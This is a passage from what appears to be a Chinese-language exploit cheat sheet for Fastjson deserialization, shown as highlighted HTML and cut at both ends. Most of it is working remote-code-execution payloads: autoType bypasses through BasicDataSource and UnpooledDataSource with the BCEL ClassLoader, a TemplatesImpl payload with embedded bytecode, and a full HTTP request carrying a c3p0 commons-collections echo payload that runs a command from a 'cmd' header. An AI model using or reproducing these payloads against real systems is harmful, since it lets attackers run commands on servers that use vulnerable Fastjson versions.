7c$ae$e0$a6$86$_$f0$a5l$f8W$e4$e1$f2$98$86$af$f1$8d$86$5b2T$7c$de$aeH$c7q$d3ve$d1$9dk$f9$8e$af$98$a2$iX$$$85$e85$ddRv$de$f0$83E$dfu$b2$cb$V$8a$b4$3aM$M$3dk6$9e$98$b7$a9$85$d9$v$R$U$5d$w$b0$f3$d2$e4$a3$E$8c4$91r$ae$e8$RS4$cdf$c5$f3$84$T$d4$cf$5d$e9$81$c9GQd$d9M$d4FSW$9b$a1I7$a4Yo$827$5cI$9b$N$_$a8M6mj$gjmz$7d$9e$eb$3c$8e$84$ad$ad$d7vl$D$9bK$ebl$g$bd4$b3C$ee$S$96$b3$ec$$$R$edG$g$7d$85$cf$a0$c9W$a4$gX$af$a2$feSN$c7$85i$h$9e$98$ab$e7$d6$ee$8b$60$cc4$85$ef$5b$b5$efF$y$7dQ$7eW$g$a7$f1$86$l$88R$f8$40$cexnYx$c1$N$86$7d$ff$c1$c3j$L$db$C$f7$7c$99$8cr$86$9c$9a$e6n$ad$82$b8$7c$a7$86$e5$Q$c1$bd$8d$8esE$c3$cb$cb$d7$e2$98bd$e0$o$Be$5b$c3Nt$ae$ef$e4H$7d$c6k$aa$b3$V$t$b0J$f5$c7$5c$3ft7$99Ej2$8c$89$VA$_$u$9d$de$60$Q$h$z$88$C$c9Vs$a8H$c9$b0$89B$9dt$ca$95$80$y$85A$acm$ab$87$b3$dcl$c3$F$99$f7$a47$bc$90$eck$V_$i$X$b6U$92$df$U$86$fd$ff$ceu$e3c$96E84$ef$e8$c3$B$fa$7d$91$7f$z$60$f2$ebM2C$a7$9d$b42Z$e3$83w$c1$ee$d0$86$nK2QS$s$c0$f1D$j$da$d2O$O$da$Ip$f5$kZ$aahM$c5$aa$88$9f$gL$rZ$efC$a9$82O$k$60$b4KV$a1NE$80$b6$Q$a0$d5$B$83$a9$f6h$3b$7d$e0$60$84$j$8e$N$adn$e3$91$dd$s$b2Ku$84$d0$cd$c3$89H$bbEjS1$d2$ce$b6$a6$3a$f3$f2J$d1$VJ$a2KO$84R$8f$d5$3dq$5d$d1$e3$EM$S$b4$9b$a0$ea$cf$e8$iN$s$ee$93TS$5b$efa$5b$V$3d$v$bd$8a$ed$df$p$a5$ab$S$a3$ab$b1To$fe6$3a$e4qG$ed$b8$93d$5cO$e6u$5e$c5c$a9$5d$8d$91u$k$3a$ff$J$bbg$ef$a1OW$ab$e8$afb$cf$5d$3c$9e$da$5b$c5$be$w$f6$cb$a03$a1e$3a$aaD$e7Qz$91$7e$60$9d$fe6b$a7$eeH$e6$d9$y$bb$8cAj$95$ec$85$83$5e$92IhP$b1$8d$3a$d0G$bb$n$b4$e306$n$87$OLc3f$b1$F$$R$b8I$ffR$dcB$X$beC7$7e$c0VP$a9x$80$k$fc$K$j$bfa$3b$7e$c7$O$fcAM$ff$T$bb$f0$Xv$b3$B$f4$b11$f4$b3Y$ec$a5$88$7b$d8$V$ec$c7$93$U$edY$c4$k$S$b8M$c1S$K$9eVp$a8$$$c3M$b8$7fF$n$i$da$k$c2$93s$a3$e099$3d$87k$pv$e4$l$3eQL$40E$J$A$A&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">            }</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">        } : &quot;xxx&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">}</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java"></span><span class="token code"></span><br></span><span class="token-line" style="color:#393A34"><span class="token code"></span><span class="token code punctuation" style="color:#393A34">```</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">1.2.33&lt;=fastjson&lt;=12.36</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token code punctuation" style="color:#393A34">```</span><span class="token code code-language">java</span><span class="token code"></span><br></span><span class="token-line" style="color:#393A34"><span class="token code"></span><span class="token code code-block language-java">{</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">    &quot;name&quot;:</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">    {</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">        &quot;@type&quot; : &quot;java.lang.Class&quot;,</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">        &quot;val&quot;   : &quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">    },</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">    &quot;x&quot; : {</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">        &quot;name&quot;: {</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">            &quot;@type&quot; : &quot;java.lang.Class&quot;,</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">            &quot;val&quot;   : &quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">        },</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">        {</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">            &quot;@type&quot;:&quot;com.alibaba.fastjson.JSONObject&quot;,</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">            &quot;c&quot;: {</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">                &quot;@type&quot;:&quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource&quot;,</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">                &quot;driverClassLoader&quot;: {</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">                    &quot;@type&quot; : &quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">                },</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">                &quot;driverClassName&quot;:&quot;$$BCEL...&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">            }</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">        } : &quot;ddd&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">}</span><span class="token code"></span><br></span><span class="token-line" style="color:#393A34"><span class="token code"></span><span class="token code punctuation" style="color:#393A34">```</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">1.2.37&lt;=fastjson&lt;=1.2.47</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token code punctuation" style="color:#393A34">```</span><span class="token code code-language">java</span><span class="token code"></span><br></span><span class="token-line" style="color:#393A34"><span class="token code"></span><span class="token code code-block language-java">{</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">    &quot;name&quot;:</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">    {</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">        &quot;@type&quot; : &quot;java.lang.Class&quot;,</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">        &quot;val&quot;   : &quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">    },</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">    &quot;x&quot; : {</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">        &quot;name&quot;: {</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">            &quot;@type&quot; : &quot;java.lang.Class&quot;,</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">            &quot;val&quot;   : &quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">        },</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">        &quot;y&quot;: {</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">            &quot;@type&quot;:&quot;com.alibaba.fastjson.JSONObject&quot;,</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">            &quot;c&quot;: {</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">                &quot;@type&quot;:&quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource&quot;,</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">                &quot;driverClassLoader&quot;: {</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">                    &quot;@type&quot; : &quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">                },</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">                &quot;driverClassName&quot;:&quot;$$BCEL$..&quot;,</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">                     &quot;$ref&quot;: &quot;$.x.y.c.connection&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">            }</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">        }</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">}</span><span class="token code"></span><br></span><span class="token-line" style="color:#393A34"><span class="token code"></span><span class="token code punctuation" style="color:#393A34">```</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">其他</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token code punctuation" style="color:#393A34">```</span><span class="token code code-language">java</span><span class="token code"></span><br></span><span class="token-line" style="color:#393A34"><span class="token code"></span><span class="token code code-block language-java">{</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">  &quot;@type&quot;: &quot;org.apache.ibatis.datasource.unpooled.UnpooledDataSource&quot;,</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">  &quot;key&quot;: {</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">    &quot;@type&quot;: &quot;java.lang.Class&quot;,</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">    &quot;val&quot;: &quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">  },</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">  &quot;driverClassLoader&quot;: {</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">    &quot;@type&quot;: &quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">  },</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">  &quot;driver&quot;: &quot;$$BCEL$$xxxxxxx&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">}</span><span class="token code"></span><br></span><span class="token-line" style="color:#393A34"><span class="token code"></span><span class="token code punctuation" style="color:#393A34">```</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token title important punctuation" style="color:#393A34">###</span><span class="token title important"> TemplatesImpl</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">利用条件苛刻，可用于解决不出网利用。</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">需要调用</span><span class="token code-snippet code keyword" style="color:#00009f">`parseObject()`</span><span class="token plain">方法时，加入Feature.SupportNonPublicField参数。</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  _bytecodes要进行base64编码</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token code punctuation" style="color:#393A34">```</span><span class="token code code-language">java</span><span class="token code"></span><br></span><span class="token-line" style="color:#393A34"><span class="token code"></span><span class="token code code-block language-java">{&quot;@type&quot;:&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;,&quot;_bytecodes&quot;:[&quot;yv66vgAAADQAJgoABwAXCgAYABkIABoKABgAGwcAHAoABQAXBwAdAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEACkV4Y2VwdGlvbnMHAB4BAAl0cmFuc2Zvcm0BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWBwAfAQAEbWFpbgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYHACABAApTb3VyY2VGaWxlAQALVEVNUE9DLmphdmEMAAgACQcAIQwAIgAjAQASb3BlbiAtYSBDYWxjdWxhdG9yDAAkACUBAAZURU1QT0MBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQATamF2YS9pby9JT0V4Y2VwdGlvbgEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAE2phdmEvbGFuZy9FeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEABQAHAAAAAAAEAAEACAAJAAIACgAAAC4AAgABAAAADiq3AAG4AAISA7YABFexAAAAAQALAAAADgADAAAACwAEAAwADQANAAwAAAAEAAEADQABAA4ADwABAAoAAAAZAAAABAAAAAGxAAAAAQALAAAABgABAAAAEQABAA4AEAACAAoAAAAZAAAAAwAAAAGxAAAAAQALAAAABgABAAAAFgAMAAAABAABABEACQASABMAAgAKAAAAJQACAAIAAAAJuwAFWbcABkyxAAAAAQALAAAACgACAAAAGQAIABoADAAAAAQAAQAUAAEAFQAAAAIAFg==&quot;],&quot;_name&quot;:&quot;a.b&quot;,&quot;_tfactory&quot;:{ },&quot;_outputProperties&quot;:{ },&quot;_version&quot;:&quot;1.0&quot;,&quot;allowedProtocols&quot;:&quot;all&quot;}</span><span class="token code"></span><br></span><span class="token-line" style="color:#393A34"><span class="token code"></span><span class="token code punctuation" style="color:#393A34">```</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token title important punctuation" style="color:#393A34">####</span><span class="token title important"> c3p0#WrapperConnectionPoolDataSource</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">可用于解决不出网利用。</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">fastjson &lt;1.2.47</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">利用c3p0二次反序列化 cc payload到达回显。</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token code punctuation" style="color:#393A34">```</span><span class="token code code-language">java</span><span class="token code"></span><br></span><span class="token-line" style="color:#393A34"><span class="token code"></span><span class="token code code-block language-java">POST /json HTTP/1.1</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">Host: 127.0.0.1:8999</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">Upgrade-Insecure-Requests: 1</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">Accept-Encoding: gzip, deflate</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">cmd: dir</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">Accept-Language: zh-CN,zh;q=0.9</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">Connection: close</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">Content-Type: application/json</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">Content-Length: 8925</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">{&quot;e&quot;:{&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource&quot;},&quot;f&quot;:{&quot;@type&quot;:&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource&quot;,&quot;userOverridesAsString&quot;:&quot;HexAsciiSerializedMap:ACED0005737200116A6176612E7574696C2E48617368536574BA44859596B8B7340300007870770C000000103F400000000000027372002A6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E6D61702E4C617A794D61706EE594829E7910940300014C0007666163746F727974002C4C6F72672F6170616368652F636F6D6D6F6E732F636F6C6C656374696F6E732F5472616E73666F726D65723B78707372003A6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E66756E63746F72732E496E766F6B65725472616E73666F726D657287E8FF6B7B7CCE380200035B000569417267737400135B4C6A6176612F6C616E672F4F626A6563743B4C000B694D6574686F644E616D657400124C6A6176612F6C616E672F537472696E673B5B000B69506172616D54797065737400125B4C6A6176612F6C616E672F436C6173733B7870707400136765744F757470757450726F7065727469657370737200116A6176612E7574696C2E486173684D61700507DAC1C31660D103000246000A6C6F6164466163746F724900097468726573686F6C6478703F4000000000000C770800000010000000017371007E000B3F4000000000000C770800000010000000017372003A636F6D2E73756E2E6F72672E6170616368652E78616C616E2E696E7465726E616C2E78736C74632E747261782E54656D706C61746573496D706C09574FC16EACAB3303000649000D5F696E64656E744E756D62657249000E5F7472616E736C6574496E6465785B000A5F62797465636F6465737400035B5B425B00065F636C61737371007E00084C00055F6E616D6571007E00074C00115F6F757470757450726F706572746965737400164C6A6176612F7574696C2F50726F706572746965733B787000000000FFFFFFFF757200035B5B424BFD19156767DB37020000787000000001757200025B42ACF317F8060854E0020000787000000DCFCAFEBABE0000003400CD0A0014005F090033006009003300610700620A0004005F09003300630A006400650A003300660A000400670A000400680A0033006907006A0A0014006B0A0012006C08006D0B000C006E08006F0700700A001200710700720A007300740700750700760700770800780A0079007A0A0018007B08007C0A0018007D08007E08007F0800800B001600810700820A008300840A008300850A008600870A002200880800890A0022008A0A0022008B0A008C008D0A008C008E0A0012008F0A009000910A009000920A001200930A003300940700950A00120096070097010001680100134C6A6176612F7574696C2F486173685365743B0100095369676E61747572650100274C6A6176612F7574696C2F486173685365743C4C6A6176612F6C616E672F4F626A6563743B3E3B010001720100274C6A617661782F736572766C65742F687474702F48747470536572766C6574526571756573743B010001700100284C6A617661782F736572766C65742F687474702F48747470536572766C6574526573706F6E73653B0100063C696E69743E010003282956010004436F646501000F4C696E654E756D6265725461626C650100124C6F63616C5661726961626C655461626C65010004746869730100204C79736F73657269616C2F7061796C6F6164732F436F6D6D6F6E4563686F313B01000169010015284C6A6176612F6C616E672F4F626A6563743B295A0100036F626A0100124C6A6176612F6C616E672F4F626A6563743B01000D537461636B4D61705461626C65010016284C6A6176612F6C616E672F4F626A6563743B492956010001650100154C6A6176612F6C616E672F457863657074696F6E3B010008636F6D6D616E64730100135B4C6A6176612F6C616E672F537472696E673B0100016F01000564657074680100014907007607004C070072010001460100017101000D6465636C617265644669656C640100194C6A6176612F6C616E672F7265666C6563742F4669656C643B01000573746172740100016E0100114C6A6176612F6C616E672F436C6173733B07007007009807009901000A536F7572636546696C65010010436F6D6D6F6E4563686F312E6A6176610C003C003D0C003800390C003A003B0100116A6176612F7574696C2F486173685365740C0034003507009A0C009B009C0C005300480C009D00440C009E00440C004300440100256A617661782F736572766C65742F687474702F48747470536572766C6574526571756573740C009F00A00C00A100A2010003636D640C00A300A401000B676574526573706F6E736501000F6A6176612F6C616E672F436C6173730C00A500A60100106A6176612F6C616E672F4F626A6563740700A70C00A800A90100266A617661782F736572766C65742F687474702F48747470536572766C6574526573706F6E73650100136A6176612F6C616E672F457863657074696F6E0100106A6176612F6C616E672F537472696E670100076F732E6E616D650700AA0C00AB00A40C00AC00AD01000357494E0C009D00AE0100022F630100072F62696E2F73680100022D630C00AF00B00100116A6176612F7574696C2F5363616E6E65720700B10C00B200B30C00B400B50700B60C00B700B80C003C00B90100025C410C00BA00BB0C00BC00AD0700BD0C00BE00BF0C00C0003D0C00C100C20700990C00C300C40C00C500C60C00C700C80C003A00480100135B4C6A6176612F6C616E672F4F626A6563743B0C00C900A001001E79736F73657269616C2F7061796C6F6164732F436F6D6D6F6E4563686F3101001A5B4C6A6176612F6C616E672F7265666C6563742F4669656C643B0100176A6176612F6C616E672F7265666C6563742F4669656C640100106A6176612F6C616E672F54687265616401000D63757272656E7454687265616401001428294C6A6176612F6C616E672F5468726561643B010008636F6E7461696E73010003616464010008676574436C61737301001328294C6A6176612F6C616E672F436C6173733B010010697341737369676E61626C6546726F6D010014284C6A6176612F6C616E672F436C6173733B295A010009676574486561646572010026284C6A6176612F6C616E672F537472696E673B294C6A6176612F6C616E672F537472696E673B0100096765744D6574686F64010040284C6A6176612F6C616E672F537472696E673B5B4C6A6176612F6C616E672F436C6173733B294C6A6176612F6C616E672F7265666C6563742F4D6574686F643B0100186A6176612F6C616E672F7265666C6563742F4D6574686F64010006696E766F6B65010039284C6A6176612F6C616E672F4F626A6563743B5B4C6A6176612F6C616E672F4F626A6563743B294C6A6176612F6C616E672F4F626A6563743B0100106A6176612F6C616E672F53797374656D01000B67657450726F706572747901000B746F55707065724361736501001428294C6A6176612F6C616E672F537472696E673B01001B284C6A6176612F6C616E672F4368617253657175656E63653B295A01000967657457726974657201001728294C6A6176612F696F2F5072696E745772697465723B0100116A6176612F6C616E672F52756E74696D6501000A67657452756E74696D6501001528294C6A6176612F6C616E672F52756E74696D653B01000465786563010028285B4C6A6176612F6C616E672F537472696E673B294C6A6176612F6C616E672F50726F636573733B0100116A6176612F6C616E672F50726F6365737301000E676574496E70757453747265616D01001728294C6A6176612F696F2F496E70757453747265616D3B010018284C6A6176612F696F2F496E70757453747265616D3B295601000C75736544656C696D69746572010027284C6A6176612F6C616E672F537472696E673B294C6A6176612F7574696C2F5363616E6E65723B0100046E6578740100136A6176612F696F2F5072696E745772697465720100077072696E746C6E010015284C6A6176612F6C616E672F537472696E673B2956010005666C7573680100116765744465636C617265644669656C647301001C28295B4C6A6176612F6C616E672F7265666C6563742F4669656C643B01000D73657441636365737369626C65010004285A2956010003676574010026284C6A6176612F6C616E672F4F626A6563743B294C6A6176612F6C616E672F4F626A6563743B0100076973417272617901000328295A01000D6765745375706572636C617373010040636F6D2F73756E2F6F72672F6170616368652F78616C616E2F696E7465726E616C2F78736C74632F72756E74696D652F41627374726163745472616E736C65740700CA0A00CB005F0021003300CB000000030008003400350001003600000002003700080038003900000008003A003B000000040001003C003D0001003E0000005C000200010000001E2AB700CC01B3000201B30003BB000459B70005B30006B8000703B80008B100000002003F0000001A0006000000140004001500080016000C001700160018001D001900400000000C00010000001E004100420000000A004300440001003E0000005A000200010000001A2AC6000DB200062AB6000999000504ACB200062AB6000A5703AC00000003003F0000001200040000001D000E001E001000210018002200400000000C00010000001A00450046000000470000000400020E01000A003A00480001003E000001D300050003000000EF1B1034A3000FB20002C6000AB20003C60004B12AB8000B9A00D7B20002C70051120C2AB6000DB6000E9900452AC0000CB30002B20002120FB900100200C7000A01B30002A7002AB20002B6000D121103BD0012B60013B2000203BD0014B60015C00016B30003A700084D01B30002B20002C60076B20003C6007006BD00184D1219B8001AB6001B121CB6001D9900102C03120F532C04121E53A7000D2C03121F532C041220532C05B20002120FB90010020053B20003B900210100BB002259B800232CB60024B60025B700261227B60028B60029B6002AB20003B900210100B6002BA700044DB12A1B0460B80008B100020047006600690017007A00E200E500170003003F0000006A001A000000250012002600130028001A0029002C002A0033002B0040002C0047002F0066003300690031006A0032006E0037007A003A007F003B008F003C0094003D009C003F00A1004000A6004200B3004400D7004500E2004700E5004600E6004800E7004B00EE004D00400000002A0004006A00040049004A0002007F0063004B004C0002000000EF004D00460000000000EF004E004F0001004700000022000B1200336107005004FC002D07005109FF003E0002070052010001070050000006000A005300480001003E000001580002000C000000842AB6000D4D2CB6002C4E2DBE360403360515051504A200652D1505323A06190604B6002D013A0719062AB6002E3A071907B6000DB6002F9A000C19071BB80030A7002F1907C00031C000313A081908BE360903360A150A1509A200161908150A323A0B190B1BB80030840A01A7FFE9A700053A08840501A7FF9A2CB60032594DC7FF85B100010027006F007200170003003F0000004200100000005000050052001E00530024005400270056002F0058003A00590043005B0063005C0069005B006F00620072006100740052007A0065007B00660083006800400000003E00060063000600540046000B0027004D004D00460007001E00560055005600060000008400570046000000000084004E004F00010005007F00580059000200470000002E0008FC000507005AFE000B07005B0101FD003107005C070052FE00110700310101F8001942070050F90001F800050001005D00000002005E707400016170770100787400017878737200116A6176612E6C616E672E496E746567657212E2A0A4F781873802000149000576616C7565787200106A6176612E6C616E672E4E756D62657286AC951D0B94E08B020000787000000000787871007E000D78;&quot;}}</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java"></span><span class="token code"></span><br></span><span class="token-line" style="color:#393A34"><span class="token code"></span><span class="token code punctuation" style="color:#393A34">```</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token title important punctuation" style="color:#393A34">###</span><span class="token title important"> Fastjson 1.2.25-1.2.41</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">1.2.25后将TypeUtils.loadClass替换为checkAutoType()函数，增加了黑名单和白名单。</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">把autoTypeSupport默认为False。</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token 